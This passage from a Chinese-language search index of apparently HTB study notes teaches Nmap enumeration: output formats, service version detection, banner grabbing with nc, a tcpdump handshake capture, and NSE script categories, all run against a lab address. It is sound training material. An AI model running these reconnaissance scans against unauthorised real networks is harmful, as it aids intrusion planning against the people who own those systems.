host up) scanned in 10.22 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-oA target</code> \u4ee5\u6240\u6709\u683c\u5f0f\u4fdd\u5b58\u7ed3\u679c\uff0c\u6bcf\u4e2a\u6587\u4ef6\u7684\u540d\u79f0\u4ee5\u201c\u76ee\u6807\u201d\u5f00\u5934\u3002 <p>\u5982\u679c\u6ca1\u6709\u7ed9\u51fa\u5b8c\u6574\u8def\u5f84\uff0c\u7ed3\u679c\u5c06\u5b58\u50a8\u5728\u6211\u4eec\u5f53\u524d\u6240\u5728\u7684\u76ee\u5f55\u4e2d\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u770b\u770b\u4e3a<code>Nmap</code>\u6211\u4eec\u521b\u5efa\u7684\u4e0d\u540c\u683c\u5f0f\u3002</p> <pre><code>darkinga@htb[/htb]$ ls\n\ntarget.gnmap target.xml  target.nmap\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_16","title":"\u6b63\u5e38\u8f93\u51fa","text":"<p>\u6b63\u5e38\u8f93\u51fa</p> <pre><code>darkinga@htb[/htb]$ cat target.nmap\n\n# Nmap 7.80 scan initiated Tue Jun 16 12:14:53 2020 as: nmap -p- -oA target 10.129.2.28\nNmap scan report for 10.129.2.28\nHost is up (0.053s latency).\nNot shown: 4 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n25/tcp open  smtp\n80/tcp open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\n# Nmap done at Tue Jun 16 12:15:03 2020 -- 1 IP address (1 host up) scanned in 10.22 seconds\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#grepable","title":"Grepable \u8f93\u51fa","text":"<p>Grepable \u8f93\u51fa</p> <pre><code>darkinga@htb[/htb]$ cat target.gnmap\n\n# Nmap 7.80 scan initiated Tue Jun 16 12:14:53 2020 as: nmap -p- -oA target 10.129.2.28\nHost: 10.129.2.28 ()    Status: Up\nHost: 10.129.2.28 ()    Ports: 22/open/tcp//ssh///, 25/open/tcp//smtp///, 80/open/tcp//http///  Ignored State: closed (4)\n# Nmap done at Tue Jun 16 12:14:53 2020 -- 1 IP address (1 host up) scanned in 10.22 seconds\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#xml","title":"XML \u8f93\u51fa","text":"<p>XML \u8f93\u51fa</p> <pre><code>darkinga@htb[/htb]$ cat target.xml\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE nmaprun&gt;\n&lt;?xml-stylesheet href=\"file:///usr/local/bin/../share/nmap/nmap.xsl\" type=\"text/xsl\"?&gt;\n&lt;!-- Nmap 7.80 scan initiated Tue Jun 16 12:14:53 2020 as: nmap -p- -oA target 10.129.2.28 --&gt;\n&lt;nmaprun scanner=\"nmap\" args=\"nmap -p- -oA target 10.129.2.28\" start=\"12145301719\" startstr=\"Tue Jun 16 12:15:03 2020\" version=\"7.80\" xmloutputversion=\"1.04\"&gt;\n&lt;scaninfo type=\"syn\" protocol=\"tcp\" numservices=\"65535\" services=\"1-65535\"/&gt;\n&lt;verbose level=\"0\"/&gt;\n&lt;debugging level=\"0\"/&gt;\n&lt;host starttime=\"12145301719\" endtime=\"12150323493\"&gt;&lt;status state=\"up\" reason=\"arp-response\" reason_ttl=\"0\"/&gt;\n&lt;address addr=\"10.129.2.28\" addrtype=\"ipv4\"/&gt;\n&lt;address addr=\"DE:AD:00:00:BE:EF\" addrtype=\"mac\" vendor=\"Intel Corporate\"/&gt;\n&lt;hostnames&gt;\n&lt;/hostnames&gt;\n&lt;ports&gt;&lt;extraports state=\"closed\" count=\"4\"&gt;\n&lt;extrareasons reason=\"resets\" count=\"4\"/&gt;\n&lt;/extraports&gt;\n&lt;port protocol=\"tcp\" portid=\"22\"&gt;&lt;state state=\"open\" reason=\"syn-ack\" reason_ttl=\"64\"/&gt;&lt;service name=\"ssh\" method=\"table\" conf=\"3\"/&gt;&lt;/port&gt;\n&lt;port protocol=\"tcp\" portid=\"25\"&gt;&lt;state state=\"open\" reason=\"syn-ack\" reason_ttl=\"64\"/&gt;&lt;service name=\"smtp\" method=\"table\" conf=\"3\"/&gt;&lt;/port&gt;\n&lt;port protocol=\"tcp\" portid=\"80\"&gt;&lt;state state=\"open\" reason=\"syn-ack\" reason_ttl=\"64\"/&gt;&lt;service name=\"http\" method=\"table\" conf=\"3\"/&gt;&lt;/port&gt;\n&lt;/ports&gt;\n&lt;times srtt=\"52614\" rttvar=\"75640\" to=\"355174\"/&gt;\n&lt;/host&gt;\n&lt;runstats&gt;&lt;finished time=\"12150323493\" timestr=\"Tue Jun 16 12:14:53 2020\" elapsed=\"10.22\" summary=\"Nmap done at Tue Jun 16 12:15:03 2020; 1 IP address (1 host up) scanned in 10.22 seconds\" exit=\"success\"/&gt;&lt;hosts up=\"1\" down=\"0\" total=\"1\"/&gt;\n&lt;/runstats&gt;\n&lt;/nmaprun&gt;\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_17","title":"\u6837\u5f0f\u8868","text":"<p>\u901a\u8fc7 XML \u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u8f7b\u677e\u521b\u5efa\u6613\u4e8e\u9605\u8bfb\u7684 HTML \u62a5\u544a\uff0c\u5373\u4f7f\u5bf9\u4e8e\u975e\u6280\u672f\u4eba\u5458\u4e5f\u662f\u5982\u6b64\u3002\u8fd9\u5728\u4ee5\u540e\u5bf9\u6587\u6863\u975e\u5e38\u6709\u7528\uff0c\u56e0\u4e3a\u5b83\u4ee5\u8be6\u7ec6\u548c\u6e05\u6670\u7684\u65b9\u5f0f\u5c55\u793a\u4e86\u6211\u4eec\u7684\u7ed3\u679c\u3002\u8981\u5c06\u5b58\u50a8\u7684\u7ed3\u679c\u4ece XML \u683c\u5f0f\u8f6c\u6362\u4e3a HTML\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8be5\u5de5\u5177<code>xsltproc</code>\u3002</p> <p>XML \u8f93\u51fa</p> <pre><code>darkinga@htb[/htb]$ xsltproc target.xml -o target.html\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u73b0\u5728\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00 HTML \u6587\u4ef6\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u6e05\u6670\u4e14\u7ed3\u6784\u5316\u7684\u7ed3\u679c\u5c55\u793a\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap_2","title":"Nmap\u62a5\u544a","text":"<p>\u6709\u5173\u8f93\u51fa\u683c\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u8bbf\u95ee\uff1ahttps ://nmap.org/book/output.html</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_18","title":"\u670d\u52a1\u679a\u4e3e","text":"<p>\u5bf9\u6211\u4eec\u6765\u8bf4\uff0c\u5c3d\u53ef\u80fd\u51c6\u786e\u5730\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u53ca\u5176\u7248\u672c\u81f3\u5173\u91cd\u8981\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6b64\u4fe1\u606f\u626b\u63cf\u5df2\u77e5\u6f0f\u6d1e\uff0c\u5e76\u5728\u627e\u5230\u65f6\u5206\u6790\u8be5\u7248\u672c\u7684\u6e90\u4ee3\u7801\u3002\u786e\u5207\u7684\u7248\u672c\u53f7\u4f7f\u6211\u4eec\u80fd\u591f\u641c\u7d22\u9002\u5408\u76ee\u6807\u670d\u52a1\u548c\u64cd\u4f5c\u7cfb\u7edf\u7684\u66f4\u7cbe\u786e\u7684\u6f0f\u6d1e\u5229\u7528\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_19","title":"\u670d\u52a1\u7248\u672c\u68c0\u6d4b","text":"<p>\u5efa\u8bae\u9996\u5148\u6267\u884c\u5feb\u901f\u7aef\u53e3\u626b\u63cf\uff0c\u8fd9\u53ef\u4ee5\u8ba9\u6211\u4eec\u5927\u81f4\u4e86\u89e3\u53ef\u7528\u7aef\u53e3\u3002\u8fd9\u4f1a\u663e\u7740\u51cf\u5c11\u6d41\u91cf\uff0c\u8fd9\u5bf9\u6211\u4eec\u6765\u8bf4\u662f\u6709\u5229\u7684\uff0c\u5426\u5219\u6211\u4eec\u53ef\u80fd\u4f1a\u88ab\u5b89\u5168\u673a\u5236\u53d1\u73b0\u5e76\u963b\u6b62\u3002\u6211\u4eec\u53ef\u4ee5\u5148\u5904\u7406\u8fd9\u4e9b\u5e76\u5728\u540e\u53f0\u8fd0\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u5b83\u4f1a\u663e\u793a\u6240\u6709\u6253\u5f00\u7684\u7aef\u53e3 ( <code>-p-</code>)\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7248\u672c\u626b\u63cf\u6765\u626b\u63cf\u670d\u52a1\u53ca\u5176\u7248\u672c\u7684\u7279\u5b9a\u7aef\u53e3\uff08<code>-sV</code>\uff09\u3002</p> <p>\u5b8c\u6574\u7684\u7aef\u53e3\u626b\u63cf\u9700\u8981\u76f8\u5f53\u957f\u7684\u65f6\u95f4\u3002\u8981\u67e5\u770b\u626b\u63cf\u72b6\u6001\uff0c\u6211\u4eec\u53ef\u4ee5\u5728<code>[Space Bar]</code>\u626b\u63cf\u8fc7\u7a0b\u4e2d\u6309 \uff0c\u8fd9\u5c06\u5bfc\u81f4<code>Nmap</code>\u5411\u6211\u4eec\u663e\u793a\u626b\u63cf\u72b6\u6001\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 19:44 CEST\n[Space Bar]\nStats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 3.64% done; ETC: 19:45 (0:00:53 remaining)\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7684\u53e6\u4e00\u4e2a\u9009\u9879 ( <code>--stats-every=5s</code>) \u662f\u5b9a\u4e49\u5e94\u663e\u793a\u72b6\u6001\u7684\u65f6\u95f4\u6bb5\u3002\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u79d2\u6570 ( <code>s</code>) \u6216\u5206\u949f\u6570 ( <code>m</code>)\uff0c\u5728\u6b64\u4e4b\u540e\u6211\u4eec\u60f3\u8981\u83b7\u53d6\u72b6\u6001\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV --stats-every=5s\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 19:46 CEST\nStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 13.91% done; ETC: 19:49 (0:00:31 remaining)\nStats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\nSYN Stealth Scan Timing: About 39.57% done; ETC: 19:48 (0:00:15 remaining)\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <code>--stats-every=5s</code> \u6bcf 5 \u79d2\u663e\u793a\u4e00\u6b21\u626b\u63cf\u8fdb\u5ea6\u3002 <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u589e\u52a0<code>verbosity level</code>\uff08<code>-v</code>/ <code>-vv</code>\uff09\uff0c\u8fd9\u6837\u5728\u68c0\u6d4b\u5230\u7aef\u53e3\u65f6\u4f1a\u76f4\u63a5\u663e\u793a\u7ed9\u6211\u4eec\u6253\u5f00\u7684\u7aef\u53e3<code>Nmap</code>\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV -v \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 20:03 CEST\nNSE: Loaded 45 scripts for scanning.\nInitiating ARP Ping Scan at 20:03\nScanning 10.129.2.28 [1 port]\nCompleted ARP Ping Scan at 20:03, 0.03s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 20:03\nCompleted Parallel DNS resolution of 1 host. at 20:03, 0.02s elapsed\nInitiating SYN Stealth Scan at 20:03\nScanning 10.129.2.28 [65535 ports]\nDiscovered open port 995/tcp on 10.129.2.28\nDiscovered open port 80/tcp on 10.129.2.28\nDiscovered open port 993/tcp on 10.129.2.28\nDiscovered open port 143/tcp on 10.129.2.28\nDiscovered open port 25/tcp on 10.129.2.28\nDiscovered open port 110/tcp on 10.129.2.28\nDiscovered open port 22/tcp on 10.129.2.28\n&lt;SNIP&gt;\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <code>-v</code> \u589e\u52a0\u626b\u63cf\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u663e\u793a\u66f4\u8be6\u7ec6\u7684\u4fe1\u606f\u3002"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_20","title":"\u6a2a\u5e45\u6293\u53d6","text":"<p>\u626b\u63cf\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u5c06\u770b\u5230\u6240\u6709\u5177\u6709\u76f8\u5e94\u670d\u52a1\u7684 TCP \u7aef\u53e3\u53ca\u5176\u5728\u7cfb\u7edf\u4e0a\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u7684\u7248\u672c\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 20:00 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.013s latency).\nNot shown: 65525 closed ports\nPORT      STATE    SERVICE      VERSION\n22/tcp    open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n25/tcp    open     smtp         Postfix smtpd\n80/tcp    open     http         Apache httpd 2.4.29 ((Ubuntu))\n110/tcp   open     pop3         Dovecot pop3d\n139/tcp   filtered netbios-ssn\n143/tcp   open     imap         Dovecot imapd (Ubuntu)\n445/tcp   filtered microsoft-ds\n993/tcp   open     ssl/imap     Dovecot imapd (Ubuntu)\n995/tcp   open     ssl/pop3     Dovecot pop3d\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nService Info: Host:  inlane; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 91.73 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <p>\u9996\u5148\uff0c<code>Nmap</code>\u67e5\u770b\u626b\u63cf\u7aef\u53e3\u7684\u6a2a\u5e45\u5e76\u5c06\u5176\u6253\u5370\u51fa\u6765\u3002\u5982\u679c\u5b83\u65e0\u6cd5\u901a\u8fc7\u6a2a\u5e45\u8bc6\u522b\u7248\u672c\uff0c<code>Nmap</code>\u5219\u4f1a\u5c1d\u8bd5\u901a\u8fc7\u57fa\u4e8e\u7b7e\u540d\u7684\u5339\u914d\u7cfb\u7edf\u6765\u8bc6\u522b\u5b83\u4eec\uff0c\u4f46\u8fd9\u4f1a\u663e\u7740\u589e\u52a0\u626b\u63cf\u7684\u6301\u7eed\u65f6\u95f4\u3002<code>Nmap</code>\u663e\u793a\u7ed3\u679c\u7684\u4e00\u4e2a\u7f3a\u70b9\u662f\u81ea\u52a8\u626b\u63cf\u53ef\u80fd\u4f1a\u9057\u6f0f\u4e00\u4e9b\u4fe1\u606f\uff0c\u56e0\u4e3a\u6709\u65f6<code>Nmap</code>\u4e0d\u77e5\u9053\u5982\u4f55\u5904\u7406\u5b83\u3002\u8ba9\u6211\u4eec\u770b\u4e00\u4e2a\u8fd9\u6837\u7684\u4f8b\u5b50\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p- -sV -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 20:10 CEST\n&lt;SNIP&gt;\nNSOCK INFO [0.4200s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..\nService scan match (Probe NULL matched with NULL line 3104): 10.129.2.28:25 is smtp.  Version: |Postfix smtpd|||\nNSOCK INFO [0.4200s] nsock_iod_delete(): nsock_iod_delete (IOD #1)\nNmap scan report for 10.129.2.28\nHost is up (0.076s latency).\n\nPORT   STATE SERVICE VERSION\n25/tcp open  smtp    Postfix smtpd\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nService Info: Host:  inlane\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 0.47 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p-</code> \u626b\u63cf\u6240\u6709\u7aef\u53e3\u3002 <code>-sV</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u8fdb\u884c\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <p>\u5982\u679c\u6211\u4eec\u67e5\u770b \u7684\u7ed3\u679c<code>Nmap</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7aef\u53e3\u7684\u72b6\u6001\u3001\u670d\u52a1\u540d\u79f0\u548c\u4e3b\u673a\u540d\u3002\u4e0d\u8fc7\uff0c\u8ba9\u6211\u4eec\u770b\u770b\u8fd9\u91cc\u7684\u8fd9\u4e00\u884c\uff1a</p> <ul> <li><code>NSOCK INFO [0.4200s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 18 [10.129.2.28:25] (35 bytes): 220 inlane ESMTP Postfix (Ubuntu)..</code></li> </ul> <p>\u7136\u540e\u6211\u4eec\u770b\u5230\u6211\u4eec\u76ee\u6807\u4e0a\u7684 SMTP \u670d\u52a1\u5668\u7ed9\u4e86\u6211\u4eec\u6bd4<code>Nmap</code>\u663e\u793a\u7ed9\u6211\u4eec\u66f4\u591a\u7684\u4fe1\u606f\u3002\u56e0\u4e3a\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u770b\u5230\u7684\u662f Linux \u53d1\u884c\u7248<code>Ubuntu</code>\u3002\u53d1\u751f\u8fd9\u79cd\u60c5\u51b5\u662f\u56e0\u4e3a\uff0c\u5728\u6210\u529f\u7684\u4e09\u6b21\u63e1\u624b\u4e4b\u540e\uff0c\u670d\u52a1\u5668\u901a\u5e38\u4f1a\u53d1\u9001\u4e00\u4e2a\u6807\u8bed\u4ee5\u4f9b\u8bc6\u522b\u3002\u8fd9\u7528\u4e8e\u8ba9\u5ba2\u6237\u7aef\u77e5\u9053\u5b83\u6b63\u5728\u4f7f\u7528\u54ea\u4e2a\u670d\u52a1\u3002\u5728\u7f51\u7edc\u7ea7\u522b\uff0c\u8fd9\u53d1\u751f<code>PSH</code>\u5728 TCP \u6807\u5934\u4e2d\u7684\u6807\u5fd7\u3002\u4f46\u662f\uff0c\u67d0\u4e9b\u670d\u52a1\u53ef\u80fd\u4e0d\u4f1a\u7acb\u5373\u63d0\u4f9b\u6b64\u7c7b\u4fe1\u606f\u3002\u4e5f\u53ef\u4ee5\u4ece\u76f8\u5e94\u670d\u52a1\u4e2d\u5220\u9664\u6216\u64cd\u7eb5\u6a2a\u5e45\u3002\u5982\u679c\u6211\u4eec<code>manually</code>\u4f7f\u7528 \u8fde\u63a5\u5230 SMTP \u670d\u52a1\u5668<code>nc</code>\uff0c\u6293\u53d6\u6a2a\u5e45\u5e76\u4f7f\u7528 \u62e6\u622a\u7f51\u7edc\u6d41\u91cf<code>tcpdump</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230<code>Nmap</code>\u6ca1\u6709\u663e\u793a\u7ed9\u6211\u4eec\u7684\u5185\u5bb9\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_21","title":"\u8f6c\u50a8","text":"<p>\u8f6c\u50a8</p> <pre><code>darkinga@htb[/htb]$ sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28\n\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_22","title":"\u6570\u63a7","text":"<p>\u6570\u63a7</p> <pre><code>darkinga@htb[/htb]$  nc -nv 10.129.2.28 25\n\nConnection to 10.129.2.28 port 25 [tcp/*] succeeded!\n220 inlane ESMTP Postfix (Ubuntu)\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#tcpdump-","title":"Tcpdump - \u62e6\u622a\u7684\u6d41\u91cf","text":"<p>Tcpdump - \u62e6\u622a\u7684\u6d41\u91cf</p> <pre><code>18:28:07.128564 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [S], seq 1798872233, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 331260178 ecr 0,sackOK,eol], length 0\n18:28:07.255151 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [S.], seq 1130574379, ack 1798872234, win 65160, options [mss 1460,sackOK,TS val 1800383922 ecr 331260178,nop,wscale 7], length 0\n18:28:07.255281 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], ack 1, win 2058, options [nop,nop,TS val 331260304 ecr 1800383922], length 0\n18:28:07.319306 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [P.], seq 1:36, ack 1, win 510, options [nop,nop,TS val 1800383985 ecr 331260304], length 35: SMTP: 220 inlane ESMTP Postfix (Ubuntu)\n18:28:07.319426 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], ack 36, win 2058, options [nop,nop,TS val 331260368 ecr 1800383985], length 0\n</code></pre> <p>\u524d\u4e09\u884c\u5411\u6211\u4eec\u5c55\u793a\u4e86\u4e09\u6b21\u63e1\u624b\u3002</p> 1. <code>[SYN]</code> <code>18:28:07.128564 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [S], &lt;SNIP&gt;</code> 2. <code>[SYN-ACK]</code> <code>18:28:07.255151 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [S.], &lt;SNIP&gt;</code> 3. <code>[ACK]</code> <code>18:28:07.255281 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], &lt;SNIP&gt;</code> <p>\u4e4b\u540e\uff0c\u76ee\u6807 SMTP \u670d\u52a1\u5668\u5411\u6211\u4eec\u53d1\u9001\u4e00\u4e2a\u5e26\u6709<code>PSH</code>\u548c<code>ACK</code>\u6807\u5fd7\u7684 TCP \u6570\u636e\u5305\uff0c\u5176\u4e2d<code>PSH</code>\u58f0\u660e\u76ee\u6807\u670d\u52a1\u5668\u6b63\u5728\u5411\u6211\u4eec\u53d1\u9001\u6570\u636e\uff0c\u540c\u65f6<code>ACK</code>\u901a\u77e5\u6211\u4eec\u6240\u6709\u9700\u8981\u7684\u6570\u636e\u5df2\u53d1\u9001\u3002</p> 4. <code>[PSH-ACK]</code> <code>18:28:07.319306 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [P.], &lt;SNIP&gt;</code> <p>\u6211\u4eec\u53d1\u9001\u7684\u6700\u540e\u4e00\u4e2a TCP \u6570\u636e\u5305\u4ee5<code>ACK</code>.</p> 5. <code>[ACK]</code> <code>18:28:07.319426 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], &lt;SNIP&gt;</code>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap_3","title":"Nmap \u811a\u672c\u5f15\u64ce","text":"<p>Nmap \u811a\u672c\u5f15\u64ce ( <code>NSE</code>) \u662f<code>Nmap</code>. \u5b83\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u5728 Lua \u4e2d\u521b\u5efa\u811a\u672c\u4ee5\u4e0e\u67d0\u4e9b\u670d\u52a1\u4ea4\u4e92\u7684\u53ef\u80fd\u6027\u3002\u8fd9\u4e9b\u811a\u672c\u603b\u5171\u53ef\u4ee5\u5206\u4e3a 14 \u7c7b\uff1a</p> \u7c7b\u522b \u63cf\u8ff0 <code>auth</code> \u8eab\u4efd\u9a8c\u8bc1\u51ed\u636e\u7684\u786e\u5b9a\u3002 <code>broadcast</code> \u7528\u4e8e\u901a\u8fc7\u5e7f\u64ad\u53d1\u73b0\u4e3b\u673a\u7684\u811a\u672c\u548c\u53d1\u73b0\u7684\u4e3b\u673a\u53ef\u4ee5\u81ea\u52a8\u6dfb\u52a0\u5230\u5269\u4f59\u7684\u626b\u63cf\u4e2d\u3002 <code>brute</code> \u6267\u884c\u5c1d\u8bd5\u901a\u8fc7\u4f7f\u7528\u51ed\u636e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u6765\u767b\u5f55\u76f8\u5e94\u670d\u52a1\u7684\u811a\u672c\u3002 <code>default</code> \u4f7f\u7528\u8be5<code>-sC</code>\u9009\u9879\u6267\u884c\u7684\u9ed8\u8ba4\u811a\u672c\u3002 <code>discovery</code> \u8bc4\u4f30\u65e0\u969c\u788d\u670d\u52a1\u3002 <code>dos</code> \u8fd9\u4e9b\u811a\u672c\u7528\u4e8e\u68c0\u67e5\u670d\u52a1\u662f\u5426\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u5e76\u4e14\u7531\u4e8e\u4f1a\u635f\u5bb3\u670d\u52a1\u800c\u8f83\u5c11\u4f7f\u7528\u3002 <code>exploit</code> \u6b64\u7c7b\u811a\u672c\u4f1a\u5c1d\u8bd5\u5229\u7528\u626b\u63cf\u7aef\u53e3\u7684\u5df2\u77e5\u6f0f\u6d1e\u3002 <code>external</code> 